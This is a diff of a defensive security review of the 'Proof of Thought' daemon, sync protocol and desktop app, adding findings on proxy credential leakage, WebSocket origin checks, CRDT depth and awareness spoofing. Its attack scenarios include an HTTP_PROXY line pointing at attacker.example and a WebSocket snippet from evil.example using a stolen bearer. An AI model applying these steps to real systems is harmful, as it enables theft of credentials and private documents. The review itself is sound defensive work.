@@ -1,10 +1,10 @@
 # Proof of Thought — repository security review
 
-**Date:** 2026-09-05
+**Date:** 2026-09-05 (second pass, same day)
 **Reviewed commit:** `f9218a707c1f7111aa003d5f849738c9f2403598` (`Complete connected reviewer setup (#71)`)
 **Scope:** the full tree as shipped: `thoughtd`, MCP, store, schema/markdown, Tauri window, native provider chat, GitHub workflows, and the documented relay/share design. `app/src-tauri` and `prototypes/` are outside the Cargo workspace; they were still reviewed as attack surface.
 
-This is a read-only review. No production code was changed.
+This is a read-only review. No production code was changed. A second pass focused on classic cyber threats: credential theft, proxy/SSRF, CSWSH, CRDT bombs, unauthenticated presence, and confused-deputy HTTP clients.
 
 ---
 
@@ -27,6 +27,7 @@ The important problems are elsewhere:
 2. **The platform bearer is a workspace-wide superuser.** `AGENTS.md` still describes suggestion-default / per-session direct-write grants that **do not exist**. Anyone who can read `daemon.json` (or XSS the window) can read and rewrite every document and mint reviewers.
 3. **`/sync` merges arbitrary Yjs bytes into the whole document**, including the `suggestions` map, with **no schema check**, and attributes every peer as the local human editor. That is survivable while `/sync` is loopback-plus-bearer; it becomes a remote collaborator bug the moment M3 reuses this protocol.
 4. **Untrusted link `href`s are not scheme-checked** on the markdown/CRDT ingest path. The owner’s “Open” action will hand them to the OS opener.
+5. **The reviewer stdio shim sends loopback Bearer traffic through `HTTP_PROXY`.** Discovery probes already disable proxies; the shim does not. A configured proxy (or a poisoned environment) can steal reviewer secrets and document bodies.
 
 Relay sharing (`thought://join/<doc_id>#<secret>`) is **specified, not implemented**. Several of the worst “wrong participant” failures are therefore still latent — but the live `/sync` codec is already missing the `share_id` field the spec depends on.
 
@@ -172,6 +173,18 @@ The connection task forces `ActorRef::editor()` for every WebSocket peer:
 
 The suggestions map is part of the same `Y.Doc`. `thought-core` comments that “the daemon is the only writer” of suggestions; that is false on this path. A crafted update can insert, accept, reject, or delete suggestion records without going through `propose_suggestion` / `accept_suggestion`.
 
+Worse: **Accept does not re-validate patch nodes.** `propose_suggestion` runs markdown through `parse_blocks` → `Schema::v0()`. `accept_suggestion` then applies the JSON already in the Y.Map:
+
+```1745:1768:crates/thought-mcp/src/workspace.rs
+fn apply_suggestion_patch(doc: &Document, patch: &SuggestionPatch) -> Result<(), WorkspaceError> {
+    match patch {
+        SuggestionPatch::ReplaceBlock { block_id, nodes }
+        | SuggestionPatch::ReplaceText { block_id, nodes } => {
+            // first node is inserted as-is; no Schema::v0() here
+```
+
+`validate_record` only checks version and a non-empty id. A peer who can `/sync` (or, after M3, a collaborator) can plant a pending suggestion whose `nodes` skip the markdown schema. If the owner clicks Accept, those nodes enter the live document. Combined with H4, that is a way to inject `javascript:` / local `http://127.0.0.1` links that look like they came from a named reviewer.
+
 **Attack scenario (today)**
 
 A local process that can read `daemon.json` (same user, backup tool, XSS in the webview — see H5) opens `ws://127.0.0.1:<port>/sync` with `thought.token.<bearer>` and:
@@ -298,6 +311,52 @@ Tool failures are logged at `warn` with the full error string (`crates/thoughtd/
 - `chmod 0700` on `THOUGHT_HOME` after `create_dir_all` (same helper as reviewer credentials).
 - `chmod 0600` on `thought.db` after open; consider a SQLite `vfs` / umask so WAL/SHM match.
 - Open logs with `0600`.
+
+---
+
+### H7. `thought-mcp-stdio` (and default `ureq`) honor `HTTP_PROXY`; discovery already opted out
+
+**Severity:** High (credential + corpus theft via proxy)
+**Status:** Bug. The loopback probe path already treats this as unsafe.
+
+ureq’s **default agent** reads `ALL_PROXY` / `HTTPS_PROXY` / `HTTP_PROXY` (and lowercase variants). The stdio shim uses that default:
+
+```157:171:crates/thoughtd/src/bin/thought-mcp-stdio.rs
+fn send_once(...) -> Result<Option<String>, ureq::Error> {
+    let mut request = ureq::post(&daemon.url)
+        .header("Authorization", &format!("Bearer {credential}"))
+        .header("Content-Type", "application/json")
+        .header("Accept", "application/json, text/event-stream");
+```
+
+`daemon.url` is `http://127.0.0.1:<port>/mcp`. ureq does **not** document an automatic loopback bypass; `NO_PROXY` is the only documented exemption.
+
+The discovery client, by contrast, builds a dedicated agent with `.proxy(None)`:
+
+```172:181:crates/thoughtd/src/discovery.rs
+fn local_agent() -> ureq::Agent {
+    ureq::Agent::config_builder()
+        .timeout_global(Some(Duration::from_secs(1)))
+        .proxy(None)
+        .max_redirects(0)
+```
+
+Built-in chat (`app/src-tauri/src/pro_chat.rs` `agent()`) also uses `config_builder` **without** `proxy(None)`, so provider requests (with the Keychain API key in `Authorization` / `x-api-key`) follow the same env proxy if that builder still inherits defaults.
+
+**Attack scenario**
+
+1. `HTTP_PROXY=http://attacker.example:8080` is set in the environment that launches ChatGPT desktop / Codex / Claude (corporate proxy, VPN helper, or malware). `NO_PROXY` does not list `127.0.0.1`.
+2. The user pastes the Proof of Thought setup command. The shim POSTs `Authorization: Bearer <reviewer-secret>` and every `read_document` / `suggest_change` body to the proxy as an absolute `http://127.0.0.1` URL.
+3. The proxy learns the 256-bit reviewer credential and the private documents. It may also fail the connection (it would dial *its* localhost), which looks like “MCP is broken” rather than theft.
+4. Same-user malware that can only set env — not read `~/.local/share/thought/reviewer-credentials/` if modes were correct — still steals the secret off the wire.
+
+This is **not** AD-21 “can read owner files.” It is a confused-deputy HTTP client sending secrets off-box.
+
+**Fix direction**
+
+- Use the same `local_agent()` (proxy disabled, no redirects, loopback URL still required) for every shim → daemon request.
+- Set `proxy(None)` on the pro-chat agent, or pin `NO_PROXY=127.0.0.1,localhost` and still disable env proxy for Keychain-backed calls unless the user has opted into a system proxy for providers.
+- Add a regression test: with `HTTP_PROXY` pointing at a sink, the shim still talks directly to 127.0.0.1 and the sink never sees `Authorization`.
 
 ---
 
@@ -468,6 +527,47 @@ Release workflow is strong: default `contents: read`, `persist-credentials: fals
 
 ---
 
+### M11. `/sync` WebSocket does not check `Origin` (CSWSH)
+
+**Severity:** Medium (needs the bearer; browsers do not apply CORS to WebSockets)
+**Status:** Hardening gap
+
+HTTP CORS middleware **adds** headers for allowed origins; it does **not reject** other origins. A page at `https://evil.example` can still `new WebSocket("ws://127.0.0.1:<port>/sync", ["thought.v1", "thought.token."+stolen])`. Fetch from that origin would be unreadable without CORS; WebSocket binary frames would not.
+
+Without the 256-bit token this is a failed handshake (401). With XSS, a leaked `daemon.json`, or H5’s `openUrl` gadget, CSWSH is the channel that actually drives H3.
+
+DNS rebinding to 127.0.0.1 does not help by itself: `Origin` would be the attacker host, still token-gated. Do not treat rebinding as a substitute for stealing the bearer — but do not skip Origin checks on a future public relay.
+
+**Fix direction:** require `Origin` to be `tauri://localhost` or the exact dev origin on `/sync` and `/editor/*`. Refuse missing/null origins on browser upgrades.
+
+---
+
+### M12. Yjs XML is applied with unbounded depth; MCP actor names are unbounded
+
+**Severity:** Medium (authenticated local DoS of `thoughtd`)
+**Status:** Hardening gap
+
+`read_children` walks `XmlFragment` recursively with no depth cap (`crates/thought-core/src/tree.rs`). `apply_peer_update` then `normalize(&candidate.read())` on commit. A bearer-holding client can send a deeply nested Yjs tree and stack-overflow or OOM the daemon — taking down **all** documents, not one connection.
+
+Internal MCP `Caller.agent` is copied into `ActorRef` with no length cap beyond the 16 MiB body. That string is stored in `actors.display_name` and echoed in presence JSON to every `/sync` subscriber.
+
+**Fix direction:** reject peer updates whose decoded tree exceeds a depth/node budget; cap `agent` / `model` / `session` the way reviewer `reported_model` is already capped (256 bytes).
+
+---
+
+### M13. Awareness is an unauthenticated map; any subscriber can overwrite another caret
+
+**Severity:** Medium today (same-user). High on a shared document after M3.
+**Status:** Protocol limitation of `y-protocols` awareness, unmitigated
+
+`Frame::Awareness` is fanout if the sender `Subscribe`d. There is no binding of payload client-ids to the socket. A peer can publish states for other client ids (spoof names/colors, hide a caret) or flood fake users.
+
+The window puts `user.color` into `element.style.setProperty("--who", ...)` (`app/src/editor.ts`, `app/src/main.ts`). Names use `textContent` (good). `--who` is used as `background` / `border-color` in `styles.css`. A `url(...)` value is mostly stopped by CSP (`img-src 'self' data:`), so this is not a practical CSP bypass today; it is still untrusted CSS.
+
+**Fix direction:** ignore awareness entries whose client id is not the sender’s; allowlist `--who` as `#rrggbb`; do not reuse this awareness channel on the relay without that filter.
+
+---
+
 ### L1. Non-constant-time platform-bearer compare
 
 `value == expected` in MCP and `/sync` middleware. 256-bit secret over loopback: practical timing extraction is unrealistic. Reviewer auth hashes then looks up — better.
@@ -514,7 +614,13 @@ There is no relay. A crash can lose the tail of the op log. Durability, not conf
 
 ### L7. Prompt-injection via suggestion markdown and explanations
 
-Explanations are capped at 16 KiB and rendered with `textContent` (no DOM XSS). The text still instructs the **human** and any **other agent** that reads `list_suggestions` (H1). Suggestion markdown is schema-validated but can be up to the 16 MiB MCP body; built-in chat suggestions are capped at 256 KiB. Inherent LLM-tooling risk.
+Explanations are capped at 16 KiB and rendered with `textContent` (no DOM XSS). The text still instructs the **human** and any **other agent** that reads `list_suggestions` (H1). Suggestion markdown is schema-validated at **proposal** time but can be up to the 16 MiB MCP body; built-in chat suggestions are capped at 256 KiB. Inherent LLM-tooling risk. Forged CRDT suggestions skip that validation (H3).
+
+---
+
+### L8. API keys: no CRLF reject; Keychain item has no extra ACL
+
+`provider_credentials::valid` rejects empty, oversized, and NUL keys, not CR/LF. A bizarre Keychain value could theoretically inject HTTP headers if the HTTP crate did not reject them (ureq/http usually will). Keychain storage uses generic passwords with default login-keychain ACLs (no `ThisDeviceOnly` / presence required). Same-user, AD-21.
 
 ---
 
@@ -527,6 +633,7 @@ These controls were checked and should be treated as invariants:
 | Bind `127.0.0.1:0` only | `crates/thoughtd/src/main.rs` |
 | 256-bit `/dev/urandom` token; `daemon.json` atomic `0600` `create_new` | `discovery.rs` |
 | Discovery URL must be `http://127.0.0.1:<port>/mcp` matching `port` | `discovery::read` |
+| Discovery HTTP client: `proxy(None)`, no redirects, 1s timeout | `discovery::local_agent` |
 | Token not logged; stderr only prints the port | `main.rs` |
 | Reviewer secrets hashed (SHA-256) in SQLite; JSON serialization omits the hash | `connections.rs`, test `connection_serialization_never_contains_credentials` |
 | Setup command contains connection id, never the secret | `app/src/reviewer-setup.ts` |
@@ -534,7 +641,9 @@ These controls were checked and should be treated as invariants:
 | Reviewers cannot use `/editor/*` or `/sync` (platform bearer only) | `main.rs` editor middleware |
 | Reviewer write tools denied even if called | `authorize` + `REVIEWER_TOOLS` |
 | `suggest_change` refused for Internal (requires a connection) | `tools.rs` |
-| Stale suggestion cannot be accepted; acceptance applies already-normalized patch | `workspace.rs` |
+| Stale suggestion cannot be accepted | `workspace.rs` |
+| MCP Bearer is checked on every request (session id is not a substitute) | `main.rs` middleware |
+| Editor API paths `encodeURIComponent` document/suggestion ids | `app/src/editor-api.ts` |
 | Awareness not persisted | `sync.rs`; tests in `sync_endpoint.rs` |
 | No `update_document(full_markdown)` | MCP surface |
 | Import path never crosses IPC; size cap; atomic export | `app/src-tauri/src/lib.rs` |
@@ -568,28 +677,32 @@ Do not describe the future relay as private. Do not add an “encrypted” flag 
 
 ## 6. Priority order
 
-**Do now (wrong participant / integrity, no protocol fantasy):**
+**Do now (wrong participant / integrity / credential theft):**
 
 1. Filter reviewer `list_suggestions` (and likely lineage/provenance/actors) to the caller’s connection — **H1**.
-2. Fix `AGENTS.md` so it matches AD-15 — **H2**.
-3. Allowlist link schemes at parse, schema, and `openUrl` — **H4**.
-4. `chmod 0700` `THOUGHT_HOME` and `0600` the DB/logs — **H6**.
-5. Cap `/sync` frames; do not create channels for unknown docs — **M3**.
-6. Gate `claude.yml` the same way as the review workflow — **M10**.
-7. Add a transport test: reviewer `replace_block` is denied — **M8**.
+2. Disable env proxies on `thought-mcp-stdio` (reuse `local_agent()`); add an `HTTP_PROXY` leak test — **H7**.
+3. Fix `AGENTS.md` so it matches AD-15 — **H2**.
+4. Allowlist link schemes at parse, schema, and `openUrl` — **H4**.
+5. `chmod 0700` `THOUGHT_HOME` and `0600` the DB/logs — **H6**.
+6. Cap `/sync` frames; do not create channels for unknown docs; cap XML depth — **M3 / M12**.
+7. Gate `claude.yml` the same way as the review workflow — **M10**.
+8. Add a transport test: reviewer `replace_block` is denied — **M8**.
+9. Re-validate suggestion patch nodes on accept; ignore `suggestions` keys on generic `Update` — **H3**.
 
 **Before any share/relay work:**
 
-8. Mandatory `share_id` on Subscribe; never authorize by `doc_id` alone — **H3 / M9**.
-9. Schema-validate (or map-filter) peer Yjs updates; stop writing suggestions through generic `Update` — **H3**.
-10. Treat wire actor descriptors as reported; keep secrets out of argv/logs — **M6 / M9**.
-11. Relay URL allowlist (`wss:` / `https:` only, no private/link-local unless explicitly loopback) — **M9**.
+10. Mandatory `share_id` on Subscribe; never authorize by `doc_id` alone — **H3 / M9**.
+11. Schema-validate (or map-filter) peer Yjs updates; stop writing suggestions through generic `Update` — **H3**.
+12. Treat wire actor descriptors as reported; keep secrets out of argv/logs — **M6 / M9**.
+13. Relay URL allowlist (`wss:` / `https:` only, no private/link-local unless explicitly loopback) — **M9**.
 
 **Defense in depth:**
 
-12. Drop `withGlobalTauri`; tighten CSP; keep the bearer out of JS if possible — **H5**.
-13. Phrase-quote FTS queries — **M5**.
-14. Narrow CORS origins — **M4**.
+14. Drop `withGlobalTauri`; tighten CSP; keep the bearer out of JS if possible — **H5**.
+15. Check WebSocket `Origin`; filter awareness client ids — **M11 / M13**.
+16. Phrase-quote FTS queries — **M5**.
+17. Narrow CORS origins — **M4**.
+18. `proxy(None)` on provider chat unless a proxy is an explicit product choice — **H7**.
 
 ---
 
@@ -605,7 +718,9 @@ Reviewed as a hostile reader of the trust boundaries in `AGENTS.md` / `docs/arch
 - Frontend: links, suggestions, search, token handling.
 - Workflows: `ci.yml`, `release.yml`, `claude.yml`, `claude-code-review.yml`.
 
-Exploratory agents were used to map surfaces; every High/Medium finding above was re-read in source at the cited lines. Ordinary unit tests were not re-run; this review did not change runtime code.
+Exploratory agents mapped surfaces; every High/Medium finding was re-read in source at the cited lines.
+
+The second pass re-checked: ureq proxy defaults vs `discovery::local_agent`, stdio shim request construction, WebSocket vs CORS, suggestion accept vs schema, Yjs `read_children` recursion, awareness fanout, provider TLS/redirects/attachment magic bytes, Tauri opener/CSP, and CI association gates. Ordinary unit tests were not re-run; this review did not change runtime code.
 
 ---
 
